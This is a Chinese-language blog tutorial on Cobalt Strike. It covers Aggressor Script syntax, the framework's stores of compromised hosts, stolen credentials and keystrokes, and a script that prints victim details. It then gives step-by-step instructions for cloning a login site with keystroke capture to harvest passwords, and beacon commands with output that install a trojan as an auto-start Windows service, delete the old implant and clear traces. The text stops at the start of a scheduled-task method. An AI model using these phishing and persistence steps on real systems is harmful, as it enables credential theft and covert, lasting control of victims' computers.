<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">数字</span><br><span class="line">字符串</span><br><span class="line">Arrays</span><br><span class="line">Lists</span><br><span class="line">Stacks</span><br><span class="line">Sets</span><br><span class="line">Hashs</span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;kris&quot;</span>; <span class="comment"># 字符串变量的命名</span></span><br><span class="line"><span class="variable">$age</span> = 18; <span class="comment"># 数字型变量命名</span></span><br><span class="line"></span><br><span class="line">Arrays类型：</span><br><span class="line">@user_list = @(<span class="string">&quot;kris&quot;</span>,18,<span class="string">&quot;四川&quot;</span>,<span class="string">&quot;单身&quot;</span>); <span class="comment"># Sleep的阵列（列表）是类似python的那种任何元素的集合，不需要元素的类型统一，即也是一种复合数据类型。</span></span><br><span class="line">println(@name_list[0]); <span class="comment"># 下标输出信息</span></span><br><span class="line"> </span><br><span class="line">Hashs类型</span><br><span class="line">%dict[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;kris&quot;</span>;</span><br><span class="line">%dict[<span class="string">&quot;age&quot;</span>] = 18;</span><br><span class="line">%dict[<span class="string">&quot;address&quot;</span>] = <span class="string">&quot;sichuan&quot;</span>; <span class="comment"># 使用%号创建，有点和python的字典类似</span></span><br><span class="line">    </span><br><span class="line">println(<span class="string">&quot;Dict is &quot;</span>.%dict);</span><br></pre></td></tr></table></figure>

<h3 id="（1）Arrays"><a href="#（1）Arrays" class="headerlink" title="（1）Arrays"></a>（1）Arrays</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@arr1</span> = @(<span class="string">&#x27;a1&#x27;</span>,<span class="string">&#x27;a2&#x27;</span>,<span class="number">887</span>);</span><br><span class="line">println(<span class="meta">@arr1</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645029173232-1140027e-8ec2-4ae9-b315-91820ce10cad.png" alt="img"></p>
<h3 id="（2）Hashs"><a href="#（2）Hashs" class="headerlink" title="（2）Hashs"></a>（2）Hashs</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$x = <span class="number">2</span>;</span><br><span class="line">%dic[<span class="string">&quot;key1&quot;</span>] = <span class="string">&quot;value1&quot;</span>;</span><br><span class="line">%dic[<span class="string">&quot;key2&quot;</span>] = <span class="string">&quot;value2&quot;</span>;</span><br><span class="line">%dic[$x] = <span class="string">&quot;value3&quot;</span>;</span><br><span class="line">println(<span class="string">&quot;%dic is&quot;</span>.%dic);</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645030293107-79d019ff-69b8-48f6-b784-b616d8180dc8.png" alt="img"></p>
<h3 id="（3）遍历"><a href="#（3）遍历" class="headerlink" title="（3）遍历"></a>（3）遍历</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@name_list</span> = @(<span class="string">&#x27;kris&#x27;</span>,<span class="number">18</span>,<span class="string">&#x27;sichuan&#x27;</span>);</span><br><span class="line">foreach $<span class="keyword">var</span> (<span class="meta">@name_list</span>)</span><br><span class="line">&#123;</span><br><span class="line">   println($<span class="keyword">var</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645030462150-6e5e5748-aab8-4a5c-8122-ae57635a2538.png" alt="img"></p>
<h3 id="（4）Push"><a href="#（4）Push" class="headerlink" title="（4）Push"></a>（4）Push</h3><p>这个类似我们的Python中的append方法，在列表的最后面添加数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@names</span> = @(<span class="string">&quot;Hellen&quot;</span>,<span class="string">&quot;Abao&quot;</span>);</span><br><span class="line">push(<span class="meta">@names</span>,<span class="string">&quot;kris&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">println(<span class="string">&quot;name :&quot;</span>.<span class="meta">@names</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645030658019-4aa64654-b2f3-4aab-bf38-936459ee9cc3.png" alt="img"></p>
<h3 id="（5）简单的交互程序"><a href="#（5）简单的交互程序" class="headerlink" title="（5）简单的交互程序"></a>（5）简单的交互程序</h3><p>首先先看代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sub say_hello&#123;</span><br><span class="line">	println(<span class="string">&quot;hello &quot;</span>.$<span class="number">1</span>);# 定义一个函数，打印hello + 得到的参数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">command N &#123;</span><br><span class="line">	say_hello($<span class="number">1</span>); # 定义一个命令，并且将接受到的第一个参数传递给 say_hello函数。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645030873259-02cc9f6d-464c-4939-9da0-9e421233b32f.png" alt="img"></p>
<p>首先介绍定义函数的方式，在Sleep中，我们使用 sub 进行函数的定义，比如我们定义一个加法函数：  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sub add &#123;</span><br><span class="line">	<span class="keyword">return</span> $<span class="number">1.</span><span class="string">&quot;+&quot;</span>.$<span class="number">2.</span><span class="string">&quot;=&quot;</span>.($<span class="number">1</span> + $<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sum = add(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">println($sum);</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645031053362-3bf0cf93-52fa-422e-8e1a-ab682794d5e6.png" alt="img"></p>
<p>command定义命令 语法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">command &lt;你想要的命令&gt;</span><br><span class="line">	&#123;</span><br><span class="line">		执行的代码;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>这里是我们使用我们自定义的函数进行交互的，在上面我们是使用的 N 去执行 say_hello的函数体，我们现在只使用一个 command 起到相同的作用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">command N &#123;</span><br><span class="line">	println(<span class="string">&quot;hello &quot;</span>.$<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645031137918-d107582d-f525-4f41-87b1-5e428143c719.png" alt="img"></p>
<p>这里说明，我们可以直接写函数，也可以调用<code>$1</code> 是我们接受到的第一个参数，以此类推：<code>$2</code>是第二个参数……</p>
<h3 id="（6）彩色输出"><a href="#（6）彩色输出" class="headerlink" title="（6）彩色输出"></a>（6）彩色输出</h3><p>简单的来说就是让我们的控制台输出一个带颜色的字体：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">println(<span class="string">&quot;\c0This is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\c1This is my color&quot;</span>); # 这是黑色</span><br><span class="line">println(<span class="string">&quot;\c2This is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\c3This is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\c4This is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\c5This is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\c6This is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\c7This is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\c8This is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\c9This is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\cAThis is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\cBThis is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\cCThis is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\cDThis is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\cEThis is my color&quot;</span>);</span><br><span class="line">println(<span class="string">&quot;\cFThis is my color&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645031250543-5bf6af5e-3c38-49b6-9dc0-966b6d15be25.png" alt="img"></p>
<h2 id="5、键盘快捷键"><a href="#5、键盘快捷键" class="headerlink" title="5、键盘快捷键"></a>5、键盘快捷键</h2><p>语法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">bind &lt;想绑定的组合键&gt;</span><br><span class="line">	&#123;</span><br><span class="line">		按下快捷键执行的命名;	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>我们绑定一个来试试看：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">bind Ctrl+H &#123;</span><br><span class="line">	show_message(<span class="string">&quot;使用键盘快捷键哦！&quot;</span>); # 弹窗显示我们的消息</span><br><span class="line">	elog(<span class="string">&quot;使用了快捷键！&quot;</span>); # 在 Event Log位置显示信息</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645031692876-9bb0cccc-f3f1-4fb6-b3e7-d0efbf5cc08c.png" alt="img"></p>
<p>当我们 按下 Ctrl + H 的组合键的时候，我们就直接弹出信息，并且按照代码一样在 Event log下输出，组合键可以随便写，你也可以只写一个 H，都是可以的，加上 Ctrl只是约定俗，也可以使用对个修饰符，比如 Ctrl + Shift + H。</p>
<h2 id="6、菜单编写"><a href="#6、菜单编写" class="headerlink" title="6、菜单编写"></a>6、菜单编写</h2><p>菜单就是下面这样的东西：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645031766771-6bd19f2a-1563-4567-b690-809194a9dd69.png" alt="img"></p>
<p>我们可以自己定义想要的菜单或者将我们的二级菜单添加到已经存在的主菜单下，创建自定义菜单语法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">popup &lt;菜单函数名&gt;&#123;</span><br><span class="line">	        item(<span class="string">&quot;&amp;&lt;二级菜单显示&gt;&quot;</span>, &#123;点击时执行的代码，或者函数&#125;); # 第一个子菜单</span><br><span class="line">        	separator(); #分割线</span><br><span class="line">        	item(<span class="string">&quot;&amp;&lt;二级菜单名字&gt;&quot;</span>, &#123;点击时执行的代码，或者函数&#125;); # 第二个子菜单</span><br><span class="line">        	separator(); #分割线</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">menubar(<span class="string">&quot;一级菜单显示名&quot;</span>, <span class="string">&quot;菜单函数名&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>我们现在定义一个简单的菜单</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">popup my_help&#123;</span><br><span class="line">	item(<span class="string">&quot;&amp;这是百度&quot;</span>,&#123;url_open(<span class="string">&quot;http://www.baidu.com&quot;</span>)&#125;);</span><br><span class="line">	separator();</span><br><span class="line">	item(<span class="string">&quot;&amp;这是谷歌&quot;</span>,&#123;url_open(<span class="string">&quot;http://www.google.com&quot;</span>)&#125;); # url_open()这个函数是用来打开网站的</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">menubar(<span class="string">&quot;帮助菜单&quot;</span>, <span class="string">&quot;my_help&quot;</span>); # 菜单函数，一定要加上</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645031945529-26ea5f68-9078-4933-91aa-91fb26ef11fb.png" alt="img"></p>
<p>当我们点击以后，会直接打开百度的链接：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645032019792-7b63a2a6-d429-4b95-ab8d-77e9531f6a23.png" alt="img"></p>
<p>如果我们并不想创建新的菜单，而是想在默认的菜单上增加，我们可以这样做：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">popup help&#123;</span><br><span class="line">	item(<span class="string">&quot;&amp;关于汉化&quot;</span>,&#123;show_message(<span class="string">&quot;4.1汉化 by XXX &quot;</span>)&#125;);</span><br><span class="line">	separator();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645032063667-389bb402-fd98-4465-a61d-891019526f4a.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645032076155-209209e1-03f6-44af-aec8-02bdbf76b710.png" alt="img"></p>
<p>这样我们就在与原有的基础上加上了一个关于汉化的提示，这里我们是加载外部的 cna ，你可以修改默认的 default.cna来添加自己的信息。</p>
<p>除了上面说的那样的菜单，我们还会在点击右键的时候打开菜单，如下所示：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645032144040-9a4bb477-8150-4d40-ba32-1337893d9ba4.png" alt="img"></p>
<p>创建这样的菜单我们的语法为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">popup beacon_bottom&#123;</span><br><span class="line">    	item(<span class="string">&quot;&amp;关于作者&quot;</span>, &#123; url_open(<span class="string">&quot;https://wolke.cn&quot;</span>); &#125;);</span><br><span class="line">        	&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645032211168-67575ebf-20d9-471c-b06e-6f8647c11a3e.png" alt="img"></p>
<p>我们在任何的菜单里面都可以嵌套菜单，就整出一个多级菜单的样子，我们把上面的代码进行修改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">popup beacon_bottom&#123;</span><br><span class="line">	menu <span class="string">&quot;关于作者&quot;</span>&#123;</span><br><span class="line">    	item(<span class="string">&quot;&amp;博客&quot;</span>, &#123; url_open(<span class="string">&quot;https://wolke.cn&quot;</span>); &#125;);</span><br><span class="line">		item(<span class="string">&quot;&amp;QQ&quot;</span>, &#123; show_message(<span class="string">&quot;xxxxxx&quot;</span>); &#125;);</span><br><span class="line">        	&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645032261949-b4185a91-1a20-483a-9806-8112c32528db.png" alt="img"></p>
<p>多级菜单就是多了一个menu “右键显示的信息”{} 的写法，这里和上面菜单编写最大的区别就是没有menubar的写法，因为我们是直接在右键菜单上进行修改的，也就是原有菜单上修改</p>
<h2 id="7、输出框的编写"><a href="#7、输出框的编写" class="headerlink" title="7、输出框的编写"></a>7、输出框的编写</h2><p>在一些时候，我们想整一个输入框。让用户输入一些东西的时候，可以使用 dialog 数据模型进行编写，他需要接受三个参数</p>
<ul>
<li><p><code>$1</code> 对话框的名称</p>
</li>
<li><p><code>$2</code> 对话框里面的内容，可以写多个</p>
</li>
<li><p><code>$3</code> 回调函数，当用户使用 dbutton_action 调用的函数</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">popup test &#123;</span><br><span class="line">	item(<span class="string">&quot;&amp;收集信息&quot;</span>,&#123;dialog_test()&#125;); # 建立一个菜单栏目，点击收集信息时就调用show函数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">menubar(<span class="string">&quot;测试菜单&quot;</span>,<span class="string">&quot;test&quot;</span>); # 注册菜单</span><br><span class="line"></span><br><span class="line">sub show &#123;</span><br><span class="line">	show_message(<span class="string">&quot;dialog的引用是：&quot;</span>.$<span class="number">1.</span><span class="string">&quot;\n按钮名称是：&quot;</span>.$<span class="number">2</span>);</span><br><span class="line">	println(<span class="string">&quot;用户名是：&quot;</span>.$<span class="number">3</span>[<span class="string">&quot;user&quot;</span>].<span class="string">&quot;\n密码是：&quot;</span>.$<span class="number">3</span>[<span class="string">&quot;password&quot;</span>]);# 这里show函数接收到了dialog传递过来的参数，分</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">sub dialog_test &#123;</span><br><span class="line">	$info = dialog(<span class="string">&quot;这是对话框的标题&quot;</span>,%(username =&gt; <span class="string">&quot;root&quot;</span>,password =&gt; <span class="string">&quot;&quot;</span>),&amp;show); #第一个是菜单的名字，第二个是我们下面定义的菜单显示内容的默认值，第三个参数是我们回调函数，触发show函数的时候显示，并将我们的输入值传递给他</span><br><span class="line">	drow_text($info,<span class="string">&quot;user&quot;</span>,<span class="string">&quot;输入用户名：&quot;</span>); # 设置一个用户名输入条</span><br><span class="line">	drow_text($info,<span class="string">&quot;password&quot;</span>,<span class="string">&quot;输入密码&quot;</span>); </span><br><span class="line">	dbutton_action($info,<span class="string">&quot;马上起飞！&quot;</span>); # 点击按钮，触发回调函数</span><br><span class="line">	dbutton_help($info,<span class="string">&quot;https://wolke.cn&quot;</span>); # 显示帮助信息</span><br><span class="line">	dialog_show($info); # 显示文本输入框</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义 diolog 的时候，会将用户输入的东西传递给第三个参数设置的函数，dialog传递的时候一共会传递三个参数给函数</p>
<ul>
<li><p><code>$1</code> 为 dialog的引用</p>
</li>
<li><p><code>$2</code> 按钮的名称</p>
</li>
<li><p><code>$3</code>对话框输入的值</p>
</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645101340590-52b2a8c3-359c-4081-9cb1-7cbf3a657b89.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645101314700-3caa1c4c-f8e4-4f5e-a72b-a56e4551c82f.png" alt="img"></p>
<p>drow_text是指文对话框的输入，语法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">drow_text(<span class="string">&quot;变量名&quot;</span>,<span class="string">&quot;提示语句&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>dbutton_action 将操作按钮添加到dialog 中，当点击这个按钮以后，会关闭对话框，并且传输数据到回调函数中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dbutton_action($info,<span class="string">&quot;按钮的名字&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>dbutton_help 将help按钮添加到对话框中，点击help跳转网页去</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dbutton_help($info,<span class="string">&quot;https://wolke.cn&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>dialog_show 显示对话框</p>
<h2 id="8、数据接口"><a href="#8、数据接口" class="headerlink" title="8、数据接口"></a>8、数据接口</h2><table>
<thead>
<tr>
<th>Mode</th>
<th>Function</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>targets</td>
<td>存储的目标信息</td>
<td>显示上线过的主机信息</td>
</tr>
<tr>
<td>archives</td>
<td>显示最近的信息</td>
<td>显示最近的输出信息（慎用很卡）</td>
</tr>
<tr>
<td>beacons</td>
<td>显示所有的受感染的主机信息</td>
<td>显示在线和上线过的主机</td>
</tr>
<tr>
<td>credentials</td>
<td>显示凭据信息</td>
<td>我们抓取过的密码信息和制作的票据信息</td>
</tr>
<tr>
<td>downloads</td>
<td>显示下载信息</td>
<td>显示我们在受控端下载的信息</td>
</tr>
<tr>
<td>keystrokes</td>
<td>记录键盘输入</td>
<td>当我们选择进程记录键盘的时候，会将得到的键盘信息记录下来</td>
</tr>
<tr>
<td>screenshots</td>
<td>屏幕截图显示</td>
<td>显示我们截图的二进制信息流</td>
</tr>
<tr>
<td>sites</td>
<td>托管的资产</td>
<td>看起来是我们创建的监听的端口个Stager回连的端口</td>
</tr>
<tr>
<td>servers</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>上面的这些数据结构（可以理解为函数）使用他们可以返回对应的信息，以数组的形式返回，我们可以通过 Aggressor Script的控制台进行查看，例如：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645101818751-9d463b44-94ff-40c8-ab84-976d56fba93b.png" alt="img"></p>
<p>支持下标索引：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645102444107-c8c6f130-866f-47ff-a549-ca96f099ca86.png" alt="img"></p>
<p>字典的操作也可以</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645102488413-04a35284-b637-4cda-a041-405850101732.png" alt="img"></p>
<p>我们可以写一个 cna 来获取当前主机的信息：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">command info&#123;</span><br><span class="line">    println(<span class="string">&quot;IP地址：&quot;</span>.targets()[$<span class="number">1</span>][<span class="string">&quot;address&quot;</span>].<span class="string">&quot;\n操作系统：&quot;</span>.targets()[$<span class="number">1</span>][<span class="string">&quot;os&quot;</span>].<span class="string">&quot;\n用户名：&quot;</span>.targets()[$<span class="number">1</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645102575442-84567b39-4847-4942-b86b-ac0986f8c401.png" alt="img"></p>
<h1 id="九、制作钓鱼网站"><a href="#九、制作钓鱼网站" class="headerlink" title="九、制作钓鱼网站"></a>九、制作钓鱼网站</h1><h2 id="1、寻找网站模板"><a href="#1、寻找网站模板" class="headerlink" title="1、寻找网站模板"></a>1、寻找网站模板</h2><p>找有登录框的或者你想克隆的网站</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645104576327-bf816b3d-025e-498a-b4d1-ed473382cae4.png" alt="img"></p>
<h2 id="2、CS克隆网站，并开始输入监听"><a href="#2、CS克隆网站，并开始输入监听" class="headerlink" title="2、CS克隆网站，并开始输入监听"></a>2、CS克隆网站，并开始输入监听</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645104692790-73cfda39-4a48-4805-804e-68cbfb0201e6.png" alt="img"></p>
<p>填写克隆地址，勾选键盘监听</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645106491240-1a274bce-fc7e-40d1-b88c-78114fb94fd0.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645106333837-55647d08-7abe-4d4e-a277-b99ffdce9175.png" alt="img"></p>
<h2 id="3、访问测试"><a href="#3、访问测试" class="headerlink" title="3、访问测试"></a>3、访问测试</h2><p>在钓鱼页面输入账号密码</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645106362611-e08daede-9886-4136-9623-d6f1b40b8232.png" alt="img"></p>
<p>点击登录后，其实是往真实的页面提交账号密码，如果输入正确，则进入后台，输入错误，回到登录页面（如下图）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645106388311-17496462-856b-4e9f-a2cd-c0388d925fa7.png" alt="img"></p>
<p>看到用户输入的账号密码</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645106462822-1f1f6883-d669-44c4-991b-1ee12488e126.png" alt="img"></p>
<h1 id="十、权限维持"><a href="#十、权限维持" class="headerlink" title="十、权限维持"></a>十、权限维持</h1><p>如果此时我已经控制了电脑，但由于木马运行在内存中，当用户删除该文件时会报错无法删除，容易暴露。而且当用户重启电脑时，也会断开控制，此时就需要进行权限维持，而这里我们通过服务进行权限维持</p>
<h2 id="1、创建可执行文件"><a href="#1、创建可执行文件" class="headerlink" title="1、创建可执行文件"></a>1、创建可执行文件</h2><p>创建可执行文件可以在 Cobalt Strike 的 Attack -&gt; Packages -&gt; Windows Executable(s) 处进行创建，创建一个w01ke.exe文件</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645114851828-95fdc478-e729-4647-aca7-b764c39a8ef3.png" alt="img"></p>
<p>如果用于内网中的横向移动，那么强烈建议使用 SMB Beacon，SMB Beacon 就是为了内网横向扩展渗透而设计的。</p>
<h2 id="2、上传可执行文件"><a href="#2、上传可执行文件" class="headerlink" title="2、上传可执行文件"></a>2、上传可执行文件</h2><p>首先使用 Cobalt Strike 上的 upload 功能上传文件，接着复制文件到目标主机的其他位置。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; <span class="built_in">cd</span> c:\windows\temp</span><br><span class="line">beacon&gt; upload /root/w01ke.exe</span><br><span class="line">[*] Tasked beacon to upload /home/kali/w01ke.exe as w01ke.exe</span><br><span class="line">[+] host called home, sent: 289301 bytes</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645116006745-475fcd29-908f-4349-9c3d-50d7e891a8da.png" alt="img"></p>
<h2 id="3、执行文件"><a href="#3、执行文件" class="headerlink" title="3、执行文件"></a>3、执行文件</h2><h3 id="（1）方法一：服务权限维持"><a href="#（1）方法一：服务权限维持" class="headerlink" title="（1）方法一：服务权限维持"></a>（1）方法一：服务权限维持</h3><h4 id="①-生成Windows-Service-EXE并上传"><a href="#①-生成Windows-Service-EXE并上传" class="headerlink" title="① 生成Windows Service EXE并上传"></a>① 生成Windows Service EXE并上传</h4><p>就是上面生成的exe，继续即可</p>
<h4 id="②-在目标主机上创建一个服务"><a href="#②-在目标主机上创建一个服务" class="headerlink" title="② 在目标主机上创建一个服务"></a>② 在目标主机上创建一个服务</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell sc [\\用户名] create <span class="string">&quot;thisserver&quot;</span> binpath= <span class="string">&quot;c:\windows\temp\w01ke.exe&quot;</span></span><br><span class="line">等号和值之间需要有个空格</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645116580690-391cd1c2-ca92-47df-b832-3c34e771027e.png" alt="img"></p>
<p>另外还可以修改服务描述</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell sc [\\用户名] description <span class="string">&quot;thisserver&quot;</span> <span class="string">&quot;zhe shi fu wu&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645116741888-0856b029-98c2-44c5-9e69-d41397a855d7.png" alt="img"></p>
<h4 id="③-设置开机自启动"><a href="#③-设置开机自启动" class="headerlink" title="③ 设置开机自启动"></a>③ 设置开机自启动</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell sc [\\用户名] config <span class="string">&quot;thisserver&quot;</span> start= auto</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645116861696-9203d5be-70aa-4602-8036-7beed44a719b.png" alt="img"></p>
<h4 id="④-在目标机启动服务"><a href="#④-在目标机启动服务" class="headerlink" title="④ 在目标机启动服务"></a>④ 在目标机启动服务</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell sc start thisserver</span><br><span class="line">或者</span><br><span class="line">beacon&gt; shell net start thisserver</span><br></pre></td></tr></table></figure>

<p>此时就会有个新目标上线</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645116989376-c0288da1-7ca3-4d31-a14d-6c754bf8fba7.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645117678697-3cd52bff-f87e-48ef-94a4-d91b77b7ab87.png" alt="img"></p>
<h4 id="⑤-清除旧木马-becon-exe"><a href="#⑤-清除旧木马-becon-exe" class="headerlink" title="⑤ 清除旧木马 becon.exe"></a>⑤ 清除旧木马 becon.exe</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell del C:\Users\Administrator\Desktop\beacon.exe</span><br><span class="line">[*] Tasked beacon to run: del C:\Users\Administrator\Desktop\beacon.exe</span><br><span class="line">[+] host called home, sent: 76 bytes</span><br></pre></td></tr></table></figure>

<h4 id="⑥-验证开机自启服务"><a href="#⑥-验证开机自启服务" class="headerlink" title="⑥ 验证开机自启服务"></a>⑥ 验证开机自启服务</h4><p>此时重启目标机器，有新连接</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645117165493-aa20b116-dc4a-4fb1-a0e4-5f7801a56f6e.png" alt="img"></p>
<h4 id="⑦-清除痕迹与服务"><a href="#⑦-清除痕迹与服务" class="headerlink" title="⑦ 清除痕迹与服务"></a>⑦ 清除痕迹与服务</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell del C:\windows\temp\w01ke.exe</span><br><span class="line">[*] Tasked beacon to run: del C:\windows\temp\w01ke.exe</span><br><span class="line">[+] host called home, sent: 83 bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; shell sc delete <span class="string">&quot;thisserver&quot;</span></span><br><span class="line">[*] Tasked beacon to run: sc delete <span class="string">&quot;thisserver&quot;</span></span><br><span class="line">[+] host called home, sent: 69 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">[SC] DeleteService 成功</span><br></pre></td></tr></table></figure>

<h3 id="（2）方法二：计划任务维持"><a href="#（2）方法二：计划任务维持" class="headerlink" title="（2）方法二：计划任务维持"></a>（2）方法二：计划任务维持</h3><h4 id="①-生成Windows-EXE并上传"><a href="#①-生成Windows-EXE并上传" class="headerlink" title="① 生成Windows EXE并上传"></a>① 生成Windows EXE并上传</h4><p>注意这里生成的 EXE 和方法一生成的 EXE 是不一样的类型，这里生成的是Windows EXE，不是方法一中的Windows Service EXE。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645119528136-0a884633-6c11-4551-8140-9c370a2674b5.png" alt="img"></p>
<p>上传后将w01ke2.exe移动到c:\windows\temp\目录下</p>
